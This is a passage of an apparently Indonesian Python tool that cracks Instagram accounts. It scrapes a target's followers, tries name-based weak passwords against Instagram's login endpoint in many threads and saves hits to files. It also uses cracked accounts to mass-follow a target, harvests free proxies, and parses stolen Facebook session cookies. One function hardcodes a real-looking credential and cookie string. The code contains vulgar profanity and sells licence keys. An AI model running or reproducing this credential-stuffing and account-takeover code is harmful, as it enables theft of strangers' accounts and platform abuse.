    print('[%s3%s] Cek Hasil Crack'%(C,N));time.sleep(0.03)
    print('[%s4%s] Follow Target Dengan Hasil Crack'%(C,N));time.sleep(0.03)
    print('[%s0%s] Back To Menu'%(K,N));time.sleep(0.03)
    pepek = input('\n[%s+%s] Pilih : '%(C,N))
    if pepek in['']:
        print('\n%sJangan Kosong Bro !!'%(war));time.sleep(2);menu_igeh()
    elif pepek in['1','01']:
        pw = ""
        status = ""
        username = input('\n%sUsername Target %s : '%(war,Q))
        ingfo(username, pw, status)
        try:print('\n[%s1%s] Pengikut : %s%s'%(C,Q,I,str(pengikut)));print('[%s2%s] Mengikuti: %s%s'%(C,Q,I,str(mengikuti)))
        except:jalan(war+"Target Tidak DiTemukan !!");menu_igeh()
        kuntul = input('\n%sPilih : '%(war))
        limit = input('%sLimit : '%(war))
        if kuntul in['']:
            print('\n%sJangan Kosong Bro !!'%(war));time.sleep(2);menu_igeh()
        elif kuntul == "1" or kuntul == "01":
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        elif kuntul == "2" or kuntul == "02":
            __followers__(cookie, idg, limit, kuntul)
            proses()
            peweh()
        else:
            print('\nIsi Dengan Benar Kontol'%(war));time.sleep(2);menu_igeh()
    elif pepek in ['2','02']:
        jalan('\n%sMasukan Nama Target Contoh : %sdinda%s'%(war,C,Q))
        user = input('\n%sNama : '%(war))
        jumlah = int(input('%sLimit : '%(war)))
        ask = user.replace(" ", "")
        cr.append("asw_lu")
        yan.append(ask+"|"+ask)
        yan.append(ask+"_"+"|"+ask)
        for x in range(1, jumlah+1):
            yan.append(ask+str(x)+"|"+ask)
            yan.append(ask+"_"+str(x)+"|"+ask)
            yan.append(ask+str(x)+"_"+"|"+ask)
        proses()
        peweh()
    elif pepek in ['3','03']:
        dirs = os.listdir("Hasil_Igeh")
        for file in dirs:
            print("%sNama File : %sHasil_Igeh/%s%s"%(war,C,file,Q))
        try:file = input("\n%sNama File : "%(war));total = open("%s"%(file)).read().splitlines()
        except FileNotFoundError:jalan(war+"Maaf File Tidak Ada !");menu_igeh()
        nm_file = ("%s"%(file)).replace("-", " ")
        jalan(war+"Total Akun : "+I+str(len(file))+Q)
        jalan(garis)
        for memek in total:
            kontol = memek.replace("\n","")
            print("[IG] %s%s"%(kontol,Q));time.sleep(0.02)
        input('\n%sTekan Entar Untuk Kembali'%(war));menu_igeh()
    elif pepek in ['4','04']:
        jalan(war+"Maaf Bro Fiktur Ini Masih Tahap Perkembangan, Harap Besabar !");time.sleep(1);menu_igeh()
#        start_bot()
#        start_bot_v2()
 #       exit("\n"+war+"Done !!")
    elif pepek in['0','00']:
        menu()
    else:
        print('\n%sIsi Dengan Benar Bro !'%(war));time.sleep(2);menu_igeh()
def start_bot():
	global id_, user_name, ok_ik, cp_ik, gg_ik
	ok_ik = 0
	cp_ik = 0
	gg_ik = 0
	cekfile("Hasil_Igeh")
	namax=input("\n"+inp+"Nama File : ")
	try:
		file=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Maaf File Tidak DiTemukan")
		start_bot()

	user_name = input(war+"Masukkan Username Untuk Di Follow : "+I)
	dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user_name), headers={"User-Agent": user_agentz})
	dta_ = dta.json()["graphql"]["user"]
	id_ = dta_["id"]
	ikut_ = dta_["edge_followed_by"]["count"]
	nama_ = dta_["full_name"]
	meng_ = dta_["edge_follow"]["count"]
	yg_ke = str(ikut_)
	jalan(war+"Target Yang Akan DiFollow : ")
	jalan(f"\r{war}Nama      : {nama_}\n{war}Username  : {user_name}\n{war}Id User   : {id_}\n{war}Pengikut  : {str(ikut_)}\n{war}Mengikuti : {str(meng_)}")
	print(Q)
	print("\n\n"+war+"Jumlah Akun :",len(file),"\n")
	for data in file:
		try:
			data = data.replace("\n","")
			try:user,pww,tll = data.split("|")
			except:user,pww = data.split("|");tll=(" - ")
			try:bot_foll(user,pww);print("\n")
			except:time.sleep(2);pass
		except:pass

def start_bot_v2():
	global id_, user_name, ok_ik, cp_ik, gg_ik, yg_ke, ikut_
	ok_ik = 0
	cp_ik = 0
	gg_ik = 0
	cekfile("Hasil_Igeh")
	namax=input("\n"+inp+"Nama File : ")
	try:
		file=open(namax,"r").readlines()
	except FileNotFoundError:
		jalan(war+"Maaf File Tidak DiTemukan")
		start_bot()

	user_name = input(war+"Masukkan Username Untuk Di Follow : "+I)
	try:
		dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user_name), headers={"User-Agent": user_agentz})
		dta_ = dta.json()["graphql"]["user"]
		id_ = dta_["id"]
		ikut_ = dta_["edge_followed_by"]["count"]
		nama_ = dta_["full_name"]
		meng_ = dta_["edge_follow"]["count"]
		yg_ke = str(ikut_)
		jalan(war+"Target Yang Akan DiFollow : ")
		jalan(f"\r{war}Nama      : {nama_}\n{war}Username  : {user_name}\n{war}Id User   : {id_}\n{war}Pengikut  : {str(ikut_)}\n{war}Mengikuti : {str(meng_)}")
	except:jalan(war+"Target Untuk DiFollow Tidak DiTemukan !");time.sleep(1);start_bot_v2()
	print(Q)
	print("\n\n"+war+"Jumlah Akun :",len(file),"\n")
	with zthreads(max_workers=5) as (form):
		for data in file:
			try:
				data = data.replace("\n","")
				try:
					try:user,pww,tll = data.split("|")
					except:user,pww = data.split("|");tll=(" - ")
				except:continue
				form.submit(bot_foll, user, pww),
			except requests.exceptions.ConnectionError:delay()
def delay():
	for x in list(["1", "2", "3", "4", "5"]):
		for n in list(["/ ", "- ", "| ", "\ ", "| "]):
			sys.stdout.write(f'\r{Q}[ {C}{n}{Q}] Delay {x}S'),
			sys.stdout.flush()
			time.sleep(0.40)
def bot_foll(username_dev, pass_dev):
	bko = ""
	dta_ = requests.get("https://www.instagram.com/%s/?__a=1"%(username_dev), headers={"User-Agent": user_agentz})
	dta__ = dta_.json()["graphql"]["user"]
	ikut__ = dta__["edge_followed_by"]["count"]
	try:
		try:
			headerz = {"User-Agent": user_agentz}
			with requests.Session() as dev:
				url_scrap = "https://www.instagram.com/"
				data = dev.get(url_scrap, headers=headerz).content
				crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
			header = {
					"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"X-CSRFToken": crf_token,
					"X-Requested-With": "XMLHttpRequest",
					"Referer": "https://www.instagram.com/accounts/login/",
					"User-Agent": user_agentz,
					 }
			param = {
					"username": username_dev,
					"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 9999999999), pass_dev),
					"optIntoOneTap": False,
					"queryParams": {},
					"stopDeletionNonce": "",
					"trustedDeviceRecords": {}
					}
		except:
			header = {}
			param = {}
			pass
		with requests.Session() as ses_dev:
			url = "https://www.instagram.com/accounts/login/ajax/"
			respon = ses_dev.post(url, data=param, headers=header)
			data_dev = json.loads(respon.content)
			da = respon.cookies.get_dict()
			if "userId" in str(data_dev):
				follow_bot(ses_dev, username_dev)
				try:
					dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user_name), headers={"User-Agent": user_agentz})
					dta_ = dta.json()["graphql"]["user"]
					ikut_ = dta_["edge_followed_by"]["count"]
					bko += (war+username_dev+"|"+pass_dev+"|"+str(ikut__)+"\n")
					bko += (jarak+war+I+"Berhasil Follow "+M+user_name+I+" Yang Ke "+M+str(ikut_)+Q)
				except Exception as e:print(war+"Error : %s"%(e))
			elif "checkpoint_url" in str(data_dev):
				bko += (war+username_dev+"|"+pass_dev+"|"+str(ikut__)+"\n")
				bko += (jarak+war+K+"Check Points")
#				jalan(war+K+"Maaf Akun Ini Kenak Virus, Karena Belum Vaksin :V "+Q+"("+C+"AKUN INI KENAK CHECK PAKSIN"+Q)
			elif "Please wait" in str(data_dev):
				bko += (war+username_dev+"|"+pass_dev+"|"+str(ikut__)+"\n")
				bko += (jarak+war+U+"Hidupkan Mode Pesawat 5 Detik Agar Terhidar Dari Paksin")
			else:
				bko += (war+username_dev+"|"+pass_dev+"|"+str(ikut__)+"\n")
				bko += (jarak+war+M+"Kata Sandi Salah")
#				jalan(war+M+"Maaf Akun Ini Kenak Virus, Karena Belum Vaksin :V "+Q+"("+C+"AKUN INI TIDAK TERDAFTAR DI DATA PAKSIN/INSTAGRAM"+Q+")")
#				exit()
				
	except KeyboardInterrupt:
		exit()
	except requests.exceptions.ConnectionError:delay()
	print("\r"+bko+"\n")
def follow_bot(ses_dev, username_dev):
	user_target = ("%s"%(user_name))
	id_target = ("%s"%(id_))
#	user_target = "mr.risky.991"
#	id_target = "50307151176"
	dat_crf_foll = ses_dev.get("https://www.instagram.com/{}/".format(user_target), headers=headerz_api).content
	crf_token_foll = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(dat_crf_foll))[0]
	headerz_foll = {"Accept": "*/*",
					"Accept-Encoding": "gzip, deflate, br",
					"Accept-Language": "en-US,en;q=0.5",
					"Host": "www.instagram.com",
					"Origin": "https://www.instagram.com",
					"Referer": "https://www.instagram.com/{}/".format(user_target),
					"User-Agent": user_agentz,
					"X-CSRFToken": crf_token_foll}
	param_foll = {""}
	url_follow = "https://www.instagram.com/web/friendships/{}/follow/".format(id_target)
	res_foll = ses_dev.post(url_follow, headers=headerz_foll)

def __followers__(cookie, id_target, limit, kuntul):
    global looping
    if kuntul in[""]:
        print('\n %sJangan Kosong Bro !!'%(war));time.sleep(2);menu_igeh()
    elif kuntul in["1","01"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
    elif kuntul in["2","02"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
    else:
        print('\n%sIsi Dengan Benar Bro !!'%(war));time.sleep(2);menu_igeh()
    with requests.Session() as ses:
        otw = ses.get(url, cookies=cookie, headers=headerz_api)
        for xxx in json.loads(otw.content)["users"]:
            username = xxx["username"]
            nama = xxx["full_name"].encode("utf-8")
            if len(status_foll) != 1:
                sys.stdout.write('\r%sSedang Mengumpulkan %s Id... '%(war, len(yan))); sys.stdout.flush()
                yan.append(username+"|"+nama.decode("utf-8"))
                #open('Tes-dump.txt','a').write(f'{username}|{nama.decode("utf-8")}\n')
                looping+=1
            else:
                poll.append(username)
def peweh():
    with kikygtg(max_workers=40) as (__yayanXD__):
        for yntkts in yan:
            try:
                uid, name = yntkts.split('|')
                xz = name.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
#                    pwx = [name, xz[0]+"123", xz[0]+"12345"] # PW SINGKAT
                    pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345"] # PW JOZZ
                else:
#                    pwx = [name, xz[0]+"123", xz[0]+"12345"] # PW SINGKAT
                    pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"12345", "sayang", "kontol", "anjing"] # PW JOZZ
                __yayanXD__.submit(crack2, uid, pwx)
            except: pass
    exit(f"\n{war}Crack Selesai !!")

def crack2(user, pwx):
    global looping, loping
    asww = len(pwx)
    for pas in pwx:
        if looping != 1:
            pass
        else:
            if len(status_foll) != 1:
                sys.stdout.write('\r[%s%s%s] %s/%s [ OK:%s ] -- [ CP:%s ]              '%(pilih([I,K,U,M,B,C,Q]),datetime.now().strftime('%H:%M:%S'),Q,str(loping),len(yan),len(ok),len(cp))),
                sys.stdout.flush()
                asww -= 1
            else:
                pass
        try:
            if user in ok or user in cp:
                break
            pw = pas.lower()
            try:
                headerz = {"User-Agent": user_agentz_api}
                with requests.Session() as ses:
                    urll = "https://www.instagram.com/"
                    data = ses.get(urll, headers=headerz).content
                    tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
                         }
                param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
                        }
            except:
                header = {}
                param = {}
                pass
            with requests.Session() as ses:
                url = "https://www.instagram.com/accounts/login/ajax/"
                respon = ses.post(url, data=param, headers=header)
                data = json.loads(respon.content);time.sleep(00.1)
                if "checkpoint_url" in str(data):
                    cepeh = "Checkpoint"
                    ingfo(user, pw, cepeh)
                    open('Hasil_Igeh/IG-CP-%s.txt' % (durasi), 'a').write(user+"|"+pw+"\n")
                    cp.append(user)
                    break
                elif "userId" in str(data):
                    okeh = "Berhasil"
                    if len(status_foll) != 1:
                        ingfo(user, pw, okeh)
                        with open('Hasil_Igeh/IG-OK-%s.txt' % (durasi), 'a') as simpan:
                            simpan.write(user+"|"+pw+"\n")
                        ok.append(user)
                    break
                elif "Please wait" in str(data):
                    sys.stdout.write('\r[%s%s%s]%sHidup Matikan Mode Pesawat Selama 2 Detik !!%s         '%(pilih([I,K,B,C,U,P,Q]),datetime.now().strftime('%H:%M:%S'),Q,K,Q)),
                    looping+=1
                    sys.stdout.flush()
                    pwx = [pw]
                    crack2(user, pwx)
                    loping -= 1
                else:
                    looping = 1
                    pass
        except requests.exceptions.ConnectionError:
            sys.stdout.write('\r[%s%s%s]%sJaringan Anda Terputus !!%s        '%(pilih([U,K,B,C,Q]),datetime.now().strftime('%H:%M:%S'),Q,U,Q)),
            sys.stdout.flush()
            looping+=1
            pwx = [pw]
            crack2(user, pwx)
            loping -= 1
            time.sleep(2)
        except:
            looping = 1
            pass
    loping+=1
def ingfo(user, pw, status):
    try:
        global idg, pengikut, mengikuti
        dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
        dta_ = dta.json()["graphql"]["user"]
        nama = dta_["full_name"]
        idg = dta_["id"]
        pengikut = dta_["edge_followed_by"]["count"]
        mengikuti = dta_["edge_follow"]["count"]
        if status == "Berhasil":
            print(f"\r{Q}[{I}✓{Q}] Name      : {I}{nama}                 \n{Q}[{I}✓{Q}] Username  : {I}{user}                 \n{Q}[{I}✓{Q}] Password  : {I}{pw}                 \n{Q}[{I}✓{Q}] Pengikut  : {I}{str(pengikut)}                 \n{Q}[{I}✓{Q}] Mengikuti : {I}{str(mengikuti)}                 \n");play_mpv('assalamualaikum.mp3')
#            bokep_japan_yang_terbaruv2("OK", user, pw, str(pengikut))
            try:bokep_japan_yang_terbaruv2("OK", user, pw, str(pengikut))
            except:pass
        elif status == "Checkpoint":
            print(f"\n{Q}[{K}X{Q}] Name      : {K}{nama}                 \n{Q}[{K}X{Q}] Username  : {K}{user}                 \n{Q}[{K}X{Q}] Password  : {K}{pw}                 \n{Q}[{K}X{Q}] Pengikut  : {K}{str(pengikut)}                 \n{Q}[{I}X{Q}] Mengikuti : {K}{str(mengikuti)}                 \n");play_mpv('assalamualaikum.mp3')
            try:bokep_japan_yang_terbaruv2("KONTOL", user, pw, str(pengikut))
            except:pass
        else:
            pass
    except: pass
loping= 1

lis_prox = []
list_proxy = []
c=1
def cek_proxy(proxy):
        try:
                respon = requests.get("https://httpbin.org/ip", proxies={"http": proxy,"https": proxy}, timeout=3).json()["origin"]
                print (" >> Live -- "+proxy)
                list_proxy.append(proxy)
                c+=1
        except:
                pass

def scrap():
        lis_prox_dev = []
        url="https://free-proxy-list.net/#list"
        with requests.Session() as ses_dev:
                respon = ses_dev.get(url)
                sop = BeautifulSoup(respon.content, "html.parser")
                tbody = sop.find("tbody")
                for dev in tbody.find_all("tr"):
                        prox = dev.find_all("td", class_=False)
                        lis_prox_dev.append(str(prox))
#                        print (prox)
                for dev in lis_prox_dev:
                        pecah = dev.split(",")
                        ip = pecah[0].replace("<td>", "").replace("</td>","").replace("[", "")
                        port = pecah[1].replace("<td>", "").replace("</td>","").replace("[", "").strip(" ")
                        lis_prox.append(ip+":"+port+"\n")
                        print("".join(lis_prox))

        with ThreadPoolExecutor(max_workers=20) as dev:
                for prox in lis_prox_dev:
                        dev.submit(cek_proxy, prox)


def kukis_v1(kukis_sus):
	kukis_sus = kukis_sus.replace("noscript=1", "")
	kukis_impos = ""
	user = kukis_sus.split("c_user=")[1]
	try:
		user = user.split(";")[0]
	except:pass
	kukis_sus = kukis_sus.replace("c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user+";", "")
	kukis_sus = kukis_sus.replace(";c_user="+user, "")
	kukis_sus = kukis_sus.replace("c_user="+user, "")
	kukis_impos += kukis_sus
	kukis_impos += ";"
	kukis_impos += "c_user="
	kukis_impos += user
	return kukis_impos


def cek_info_via_kukis():
	global user
	session=req.Session()
	mmak_kukis_ = input(war+"Masukan Cookies :")
	user = mmak_kukis_.split("c_user=")[1]
	try:
		user = user.split(";")[0]
	except:
		user = user.split(";")[0]

	get_infoo(session,kukis_v1(mmak_kukis_))
	cek_apk(session,kukis_v1(mmak_kukis_))
	cek_apk_v1((mmak_kukis_))
	exit()

def loqq():
	session=req.Session()
	coki = "100049115432333|nazwa123|c_user=100049115432333;datr=D-L3Yb9qkX4OVD6BYFKBzGos;fr=0e0gF45N0UYwoev8e.AWWAO_9BNvqPxu314yuHJ7wRX1M.Bh9-IQ.BU.AAA.0.0.Bh9-IQ.AWUANDgUMjI;sb=EOL3Yb9bJrRKIn0OnMp1mQ1n;xs=50%3AIR11CAuScaPlqA%3A2%3A1643635216%3A-1%3A11120"
	coki = kukis_v1(coki)
	cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki,"user-agent":"Mozilla/5.0 (Linux; Android 10; CPH2179) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36"}).text
	print(cek2)
def loq():
	detik = ""
	finis = ""
	detik += str("20:08:53".replace(":", ""))
	finis += str("20:32:31".replace(":", ""))
	detik = detik
	finis = finis
	totoo = int(finis) - int(detik)
	print(totoo)

import uuid
def buat_tgl():
	global wak_
	os.system("clear")
	try:
		id1 = open(".datame1", "r").read()
		idl = open(".datame1", "r").read()
	except:
		konfo()
	gig = requests.get("https://github.com/Shanimz/zxxx123/tree/main").text.strip()
	if idl in gig:
		jok = gig.split(idl+"|")
		jokk = ("%s"%(jok[1]))
		jokkk = jokk.split("<")
		wakk = jokkk[0]
		if wakk == "":
			konfo()
	else:
		konfo()
def konfo():
	os.system("clear")
#	print (logo)
	try:
		id1 = open(".datame1", "r").read()
	except:
		id1 = uuid.uuid4().hex[:43].upper()
		jaa = open(".datame1", "w")
		jaa.write(id1)
		jaa.close()
	jalan(war+'Licese Anda : '+U+id1+Q)
	jalan(war+'Silahkan Chat *'+C+'Mr.Risky'+Q+'* Untuk Membeli Key !')
	jalan(f"""{war}Harga Key
 |
 |--3 Day      {C}10.000{Q}
 |--7 Day      {C}20.000{Q}
 |--1 Bulan    {C}50.000{Q}
 |--100 Tahun  {C}150.000{Q}
 |
{war}Method Pembayaran
 |
 |--Dana ( {U}083143565470 {Q})
 |--Ovo  ( {U}083143565470 {Q})
 |
{war}Informasi/Kontak
 |
 |--Whatsapp ( {U}083143565470 {Q})
 |--Telegram ( {U}083143565470 {Q})""")

	no_wa = "6283143565470"

	url_wa = ("https://api.whatsapp.com/send?phone="+no_wa+"&text=") # UBAH NOMOR HP KAMU
	tks = ("Halo Kak, Saya Pengguna Script *Jmbf*\nSaya Mau Beli Key/License Kak\nKey/License : *"+id1+"*")
	subprocess.check_output(["am", "start", url_wa+tks])
	sys.exit()
def cek_tgl():  # CHECK TANGGAL KONTOL
	global infona
	try:
		id1 = open(".datame1", "r").read()
		idl = open(".datame1", "r").read()
	except:
		konfo()
	gig = requests.get("https://github.com/Shanimz/zxxx123/tree/main").text.strip()
	if idl in gig:
		jok = gig.split(idl+"|")
		jokk = ("%s"%(jok[1]))
		jokkk = jokk.split("<")
		wak = jokkk[0]
		jaa = open(".datame2", "w")
		jaa.write(wak)
		jaa.close()
		wak_ = open(".datame2", "r").read().split()
	else:
		konfo()
	try:
		tgl = datetime.now()
		bln = tgl.month
		thn = tgl.year
		day = tgl.day
		mulai = datetime(int(wak_[0]), int(wak_[1]), int(wak_[2]))
		seles = datetime(thn, bln, day)
		sisa = mulai - seles
		lim_dev_id = str(sisa).split()[0]
		if "KIKY" in "":
			infona = (Q+"["+C+"++"+Q+"]"+Q+" Premium : "+I+"Ultimate/Tidak Habis²"+Q)
			jalan(infona);time.sleep(2)
			return infona
		else:
			infona = (Q+"["+C+"++"+Q+"]"+Q+" Premium : "+I+lim_dev_id+" Hari Lagi")
			jalan(infona);time.sleep(2)
			return infona
			if ":" in str(lim_dev_id) or "-" in str(lim_dev_id):
				exit(jalan(war+"Silahkan Hubungi Athour Untuk Memperpanjangankan License ! "))
				sys.exit()
	except:
		try:os.remove(".datame1")
		except:pass
		try:os.remove(".datame2")
		except:pass
		exit(jalan("Maaf License Anda Belum Terdaftar DiData Base Jmbf")) #edit menjadi kata license anda belum dikonfirmasih !! (anak kontol)
		sys.exit()
		exit()


#buat_tgl()

if "ANAK KONTOL, SAMA AJA MACAM HAKIKI" == anak_hakiki_ajg:
	if len(sys.argv) == 2:
		if sys.argv[1] == 'apk':
			cek_info_via_kukis()
			exit()
#		elif sys.argv[1] == '':
		else:
			print(war+"How to Use Secret Code ")
			exit(inp+"Type : python jmbf.py (commend)")
	try:cek_tok_tok()
	except:pass
	try:os.system("git pull");menu();exit()
	except requests.exceptions.ConnectionError:jalan(war+"Jaringan Ada Mati!!!")
	except Exception as e:print(war+"Error : %s"%(e))"))